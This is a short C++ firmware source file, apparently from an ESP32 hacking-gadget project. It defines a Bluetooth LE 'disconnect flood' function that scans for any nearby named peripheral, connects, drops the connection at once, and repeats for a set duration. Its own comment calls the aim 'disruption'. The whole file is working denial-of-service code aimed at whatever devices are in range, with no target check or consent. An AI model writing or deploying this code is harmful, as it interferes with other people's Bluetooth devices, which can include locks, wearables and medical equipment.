#if !defined(LITE_VERSION)
#include "mopie_ble_troll.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <Arduino.h>

// Mopie's own BLE disconnect flood. NimBLE connect()/disconnect() run on the
// NimBLE host thread; we keep the loop short and guard heap so the small-RAM
// board fails soft. Uses the same NimBLEScan + NimBLEClient pattern as the
// scooter module, but for generic peripheral churn (disruption), not a payload.

int mopieBLEFlood(uint32_t durationMs) {
    if (ESP.getFreeHeap() < 90000) return 0;  // too tight for BLE connect loop
    int cycles = 0;

    NimBLEDevice::init("Mopie-ble");
    NimBLEScan *scan = NimBLEDevice::getScan();
    scan->setActiveScan(false);
    scan->setInterval(50);
    scan->setWindow(48);

    unsigned long t0 = millis();
    while (millis() - t0 < durationMs) {
        // 1) scan for a peripheral
        scan->start(3);
        NimBLEScanResults res = scan->getResults();
        NimBLEAdvertisedDevice *dev = nullptr;
        int n = res.getCount();
        for (int i = 0; i < n; i++) {
            NimBLEAdvertisedDevice *d = (NimBLEAdvertisedDevice *)res.getDevice(i);
            if (d && d->haveName()) { dev = d; break; }   // prefer named devices
        }
        scan->clearResults();

        // 2) connect + immediately disconnect to churn the peripheral
        if (dev) {
            NimBLEClient *cl = NimBLEDevice::createClient();
            if (cl) {
                if (cl->connect(dev)) {
                    vTaskDelay(pdMS_TO_TICKS(30));
                    cl->disconnect();
                    cycles++;
                }
                NimBLEDevice::deleteClient(cl);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(80));
    }

    NimBLEDevice::deinit();   // free radio + heap
    return cycles;
}
#endif